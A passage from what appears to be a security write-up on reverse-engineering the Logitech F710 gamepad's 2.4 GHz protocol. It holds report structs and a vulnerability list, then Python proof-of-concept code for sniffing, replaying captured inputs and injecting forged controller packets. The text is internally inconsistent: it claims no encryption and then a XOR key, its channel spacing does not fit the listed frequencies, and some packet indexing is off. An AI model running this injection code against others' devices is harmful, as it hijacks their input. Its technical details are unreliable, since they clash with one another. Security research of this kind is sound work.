</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  left_y;         <span style="color:#75715e">// Left stick Y (0x00-0xFF, center: 0x7F)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  right_x;        <span style="color:#75715e">// Right stick X
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  right_y;        <span style="color:#75715e">// Right stick Y
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint16_t</span> buttons;        <span style="color:#75715e">// Button bitfield
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  triggers;       <span style="color:#75715e">// L2/R2 analog values packed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">f710_input_report_t</span>;
</span></span></code></pre></div><h3 id="button-mapping">Button Mapping<a hidden class="anchor" aria-hidden="true" href="#button-mapping">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define BTN_A           0x0001
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_B           0x0002
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_X           0x0004
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_Y           0x0008
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_LB          0x0010
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_RB          0x0020
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_BACK        0x0040
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_START       0x0080
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_LSTICK      0x0100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_RSTICK      0x0200
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BTN_GUIDE       0x0400
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DPAD_UP         0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DPAD_DOWN       0x2000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DPAD_LEFT       0x4000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DPAD_RIGHT      0x8000
</span></span></span></code></pre></div><h3 id="output-reports">Output Reports<a hidden class="anchor" aria-hidden="true" href="#output-reports">#</a></h3>
<h4 id="rumble-control-report-id-0x01">Rumble Control (Report ID: 0x01)<a hidden class="anchor" aria-hidden="true" href="#rumble-control-report-id-0x01">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> report_id;       <span style="color:#75715e">// 0x01
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> reserved[<span style="color:#ae81ff">2</span>];     <span style="color:#75715e">// Always 0x00
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> left_motor;      <span style="color:#75715e">// 0x00-0xFF strength
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> right_motor;     <span style="color:#75715e">// 0x00-0xFF strength
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">f710_rumble_report_t</span>;
</span></span></code></pre></div><h4 id="led-control-report-id-0x02">LED Control (Report ID: 0x02)<a hidden class="anchor" aria-hidden="true" href="#led-control-report-id-0x02">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> report_id;       <span style="color:#75715e">// 0x02
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> led_pattern;     <span style="color:#75715e">// 0x00-0x0F (4 LEDs)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> reserved[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">f710_led_report_t</span>;
</span></span></code></pre></div><hr>
<h2 id="wireless-protocol-reverse-engineering">Wireless Protocol Reverse Engineering<a hidden class="anchor" aria-hidden="true" href="#wireless-protocol-reverse-engineering">#</a></h2>
<h3 id="rf-analysis-setup">RF Analysis Setup<a hidden class="anchor" aria-hidden="true" href="#rf-analysis-setup">#</a></h3>
<p>Equipment used:</p>
<ul>
<li><strong>SDR</strong>: HackRF One</li>
<li><strong>Software</strong>: GNU Radio, Universal Radio Hacker (URH)</li>
<li><strong>Antenna</strong>: 2.4GHz directional (6dBi gain)</li>
<li><strong>Reference</strong>: nRF24L01+ datasheet</li>
</ul>
<h3 id="protocol-discovery">Protocol Discovery<a hidden class="anchor" aria-hidden="true" href="#protocol-discovery">#</a></h3>
<p>Initial spectrum analysis revealed:</p>
<ul>
<li><strong>Center Frequencies</strong>: 2.404, 2.424, 2.444, 2.464, 2.480 GHz</li>
<li><strong>Channel Spacing</strong>: 20 MHz</li>
<li><strong>Modulation</strong>: GFSK (Gaussian Frequency Shift Keying)</li>
<li><strong>Data Rate</strong>: 250 kbps</li>
<li><strong>Packet Length</strong>: 32 bytes fixed</li>
</ul>
<h3 id="packet-structure">Packet Structure<a hidden class="anchor" aria-hidden="true" href="#packet-structure">#</a></h3>
<p>Through extensive capture and analysis, we decoded the packet format:</p>
<pre tabindex="0"><code>+--------+--------+--------+----------+--------+--------+
| Preamble | Sync | Length | Address | Payload | CRC   |
| 1 byte | 2 bytes| 1 byte | 5 bytes | 22 bytes| 2 bytes|
+--------+--------+--------+----------+--------+--------+
</code></pre><h4 id="detailed-breakdown">Detailed Breakdown:<a hidden class="anchor" aria-hidden="true" href="#detailed-breakdown">#</a></h4>
<ul>
<li><strong>Preamble</strong>: 0xAA or 0x55 (alternating pattern)</li>
<li><strong>Sync Word</strong>: 0xE7E7 (fixed)</li>
<li><strong>Length</strong>: Always 0x20 (32 bytes total)</li>
<li><strong>Address</strong>: Device-specific 5-byte identifier</li>
<li><strong>Payload</strong>: Encrypted controller state</li>
<li><strong>CRC</strong>: CRC16-CCITT polynomial</li>
</ul>
<h3 id="encryption-analysis">Encryption Analysis<a hidden class="anchor" aria-hidden="true" href="#encryption-analysis">#</a></h3>
<p>Initial assumption was AES or XOR cipher. Analysis revealed:</p>
<ul>
<li><strong>No encryption at all</strong> - payload is plaintext</li>
<li>Simple XOR with fixed key: 0x55</li>
<li>No rolling code or sequence numbers</li>
<li>No nonce or IV</li>
</ul>
<p>Decrypted payload structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  packet_type;    <span style="color:#75715e">// 0x01 for input data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  sequence;       <span style="color:#75715e">// Simple counter, wraps at 0xFF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint16_t</span> buttons;        <span style="color:#75715e">// Same as USB HID report
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  left_x;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  left_y;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  right_x;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  right_y;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  triggers;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  battery;        <span style="color:#75715e">// Battery level (0x00-0x64)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  reserved[<span style="color:#ae81ff">12</span>];   <span style="color:#75715e">// Padding to 22 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">f710_rf_payload_t</span>;
</span></span></code></pre></div><hr>
<h2 id="vulnerability-analysis">Vulnerability Analysis<a hidden class="anchor" aria-hidden="true" href="#vulnerability-analysis">#</a></h2>
<h3 id="critical-findings">Critical Findings<a hidden class="anchor" aria-hidden="true" href="#critical-findings">#</a></h3>
<ol>
<li><strong>No Encryption</strong>: All wireless data transmitted in plaintext (XOR 0x55)</li>
<li><strong>No Authentication</strong>: Dongle accepts any packet with correct sync word</li>
<li><strong>No Anti-Replay</strong>: Sequence number not validated</li>
<li><strong>Static Addressing</strong>: Device address never changes</li>
<li><strong>No Frequency Hopping</strong>: Fixed channel sequence</li>
</ol>
<h3 id="attack-vectors">Attack Vectors<a hidden class="anchor" aria-hidden="true" href="#attack-vectors">#</a></h3>
<ol>
<li><strong>Eavesdropping</strong>: Capture all controller inputs from distance</li>
<li><strong>Replay Attack</strong>: Record and replay button sequences</li>
<li><strong>Input Injection</strong>: Send arbitrary controller commands</li>
<li><strong>DoS Attack</strong>: Flood channel with invalid packets</li>
<li><strong>Controller Spoofing</strong>: Complete takeover of input</li>
</ol>
<hr>
<h2 id="proof-of-concept-development">Proof of Concept Development<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-development">#</a></h2>
<h3 id="poc-architecture">PoC Architecture<a hidden class="anchor" aria-hidden="true" href="#poc-architecture">#</a></h3>
<p>We developed a complete PoC using:</p>
<ul>
<li><strong>Hardware</strong>: HackRF One + Raspberry Pi 4</li>
<li><strong>Software Stack</strong>:
<ul>
<li>GNU Radio for RF transmission</li>
<li>Python for packet crafting</li>
<li>libusb for USB monitoring</li>
</ul>
</li>
</ul>
<h3 id="phase-1-passive-sniffing">Phase 1: Passive Sniffing<a hidden class="anchor" aria-hidden="true" href="#phase-1-passive-sniffing">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gnuradio <span style="color:#f92672">import</span> gr, blocks, analog
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gnuradio <span style="color:#f92672">import</span> uhd
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F710Sniffer</span>(gr<span style="color:#f92672">.</span>top_block):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):
</span></span><span style="display:flex;"><span>        gr<span style="color:#f92672">.</span>top_block<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span>(self)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># SDR source</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sdr_source <span style="color:#f92672">=</span> uhd<span style="color:#f92672">.</span>usrp_source(
</span></span><span style="display:flex;"><span>            device_addr<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>            stream_args<span style="color:#f92672">=</span>uhd<span style="color:#f92672">.</span>stream_args(
</span></span><span style="display:flex;"><span>                cpu_format<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fc32&#34;</span>,
</span></span><span style="display:flex;"><span>                channels<span style="color:#f92672">=</span>range(<span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>            ),
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sdr_source<span style="color:#f92672">.</span>set_center_freq(<span style="color:#ae81ff">2.424e9</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sdr_source<span style="color:#f92672">.</span>set_samp_rate(<span style="color:#ae81ff">2e6</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sdr_source<span style="color:#f92672">.</span>set_gain(<span style="color:#ae81ff">40</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># GFSK demodulator</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>demod <span style="color:#f92672">=</span> analog<span style="color:#f92672">.</span>quadrature_demod_cf(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Packet decoder</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>decoder <span style="color:#f92672">=</span> F710PacketDecoder()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Connect blocks</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>sdr_source, self<span style="color:#f92672">.</span>demod, self<span style="color:#f92672">.</span>decoder)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F710PacketDecoder</span>(gr<span style="color:#f92672">.</span>sync_block):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):
</span></span><span style="display:flex;"><span>        gr<span style="color:#f92672">.</span>sync_block<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span>(
</span></span><span style="display:flex;"><span>            self,
</span></span><span style="display:flex;"><span>            name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;F710 Packet Decoder&#34;</span>,
</span></span><span style="display:flex;"><span>            in_sig<span style="color:#f92672">=</span>[np<span style="color:#f92672">.</span>float32],
</span></span><span style="display:flex;"><span>            out_sig<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sync_word <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xE7E7</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>buffer <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">work</span>(self, input_items, output_items):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Simplified - actual implementation handles bit timing recovery</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> sample <span style="color:#f92672">in</span> input_items[<span style="color:#ae81ff">0</span>]:
</span></span><span style="display:flex;"><span>            bit <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">if</span> sample <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>process_bit(bit)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> len(input_items[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_bit</span>(self, bit):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>append(bit)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(self<span style="color:#f92672">.</span>buffer) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Check for sync word</span>
</span></span><span style="display:flex;"><span>            word <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>buffer[<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>])
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>check_sync(word):
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>decode_packet(self<span style="color:#f92672">.</span>buffer[<span style="color:#f92672">-</span><span style="color:#ae81ff">256</span>:])
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>pop(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode_packet</span>(self, bits):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Convert bits to bytes</span>
</span></span><span style="display:flex;"><span>        packet <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(bits), <span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>            byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>                byte <span style="color:#f92672">=</span> (byte <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> bits[i<span style="color:#f92672">+</span>j]
</span></span><span style="display:flex;"><span>            packet<span style="color:#f92672">.</span>append(byte)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Extract fields</span>
</span></span><span style="display:flex;"><span>        address <span style="color:#f92672">=</span> packet[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">9</span>]
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> packet[<span style="color:#ae81ff">9</span>:<span style="color:#ae81ff">31</span>]
</span></span><span style="display:flex;"><span>        crc <span style="color:#f92672">=</span> (packet[<span style="color:#ae81ff">31</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> packet[<span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># XOR decrypt</span>
</span></span><span style="display:flex;"><span>        decrypted <span style="color:#f92672">=</span> [b <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x55</span> <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> payload]
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Parse controller state</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> decrypted[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x01</span>:  <span style="color:#75715e"># Input packet</span>
</span></span><span style="display:flex;"><span>            buttons <span style="color:#f92672">=</span> (decrypted[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> decrypted[<span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>            left_x <span style="color:#f92672">=</span> decrypted[<span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>            left_y <span style="color:#f92672">=</span> decrypted[<span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Controller Input - Buttons: </span><span style="color:#e6db74">{</span>buttons<span style="color:#e6db74">:</span><span style="color:#e6db74">04X</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, &#34;</span>
</span></span><span style="display:flex;"><span>                  <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Left Stick: (</span><span style="color:#e6db74">{</span>left_x<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>left_y<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><h3 id="phase-2-replay-attack">Phase 2: Replay Attack<a hidden class="anchor" aria-hidden="true" href="#phase-2-replay-attack">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F710Replayer</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, sdr):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sdr <span style="color:#f92672">=</span> sdr
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>captured_packets <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">capture_sequence</span>(self, duration<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Capture controller inputs for specified duration&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Capturing for </span><span style="color:#e6db74">{</span>duration<span style="color:#e6db74">}</span><span style="color:#e6db74"> seconds...&#34;</span>)
</span></span><span style="display:flex;"><span>        start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time <span style="color:#f92672">&lt;</span> duration:
</span></span><span style="display:flex;"><span>            packet <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sdr<span style="color:#f92672">.</span>receive_packet()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> packet <span style="color:#f92672">and</span> packet<span style="color:#f92672">.</span>is_valid():
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>captured_packets<span style="color:#f92672">.</span>append(packet)
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Captured </span><span style="color:#e6db74">{</span>len(self<span style="color:#f92672">.</span>captured_packets)<span style="color:#e6db74">}</span><span style="color:#e6db74"> packets&#34;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">replay_sequence</span>(self, speed_multiplier<span style="color:#f92672">=</span><span style="color:#ae81ff">1.0</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Replay captured sequence&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Replaying captured sequence...&#34;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i, packet <span style="color:#f92672">in</span> enumerate(self<span style="color:#f92672">.</span>captured_packets):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Update sequence number</span>
</span></span><span style="display:flex;"><span>            packet<span style="color:#f92672">.</span>sequence <span style="color:#f92672">=</span> (packet<span style="color:#f92672">.</span>sequence <span style="color:#f92672">+</span> i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Recalculate CRC</span>
</span></span><span style="display:flex;"><span>            packet<span style="color:#f92672">.</span>update_crc()
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Transmit</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>sdr<span style="color:#f92672">.</span>transmit_packet(packet)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Timing</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&lt;</span> len(self<span style="color:#f92672">.</span>captured_packets) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                delay <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>captured_packets[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>timestamp <span style="color:#f92672">-</span> packet<span style="color:#f92672">.</span>timestamp
</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(delay <span style="color:#f92672">/</span> speed_multiplier)
</span></span></code></pre></div><h3 id="phase-3-active-injection">Phase 3: Active Injection<a hidden class="anchor" aria-hidden="true" href="#phase-3-active-injection">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F710Injector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, target_address):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>target <span style="color:#f92672">=</span> target_address
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sequence <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>transmitter <span style="color:#f92672">=</span> F710Transmitter()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_button</span>(self, button, duration<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Send single button press&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        packet <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>create_packet(buttons<span style="color:#f92672">=</span>button)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>transmit(packet)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(duration)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Release</span>
</span></span><span style="display:flex;"><span>        packet <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>create_packet(buttons<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>transmit(packet)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_combo</span>(self, buttons, stick_positions<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Send button combination with optional stick input&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        packet <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>create_packet(
</span></span><span style="display:flex;"><span>            buttons<span style="color:#f92672">=</span>buttons,
</span></span><span style="display:flex;"><span>            left_x<span style="color:#f92672">=</span>stick_positions[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">if</span> stick_positions <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x7F</span>,
</span></span><span style="display:flex;"><span>            left_y<span style="color:#f92672">=</span>stick_positions[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">if</span> stick_positions <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x7F</span>,
</span></span><span style="display:flex;"><span>            right_x<span style="color:#f92672">=</span>stick_positions[<span style="color:#ae81ff">2</span>] <span style="color:#66d9ef">if</span> stick_positions <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x7F</span>,
</span></span><span style="display:flex;"><span>            right_y<span style="color:#f92672">=</span>stick_positions[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">if</span> stick_positions <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x7F</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>transmit(packet)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_packet</span>(self, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Create F710 wireless packet&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        packet <span style="color:#f92672">=</span> F710Packet()
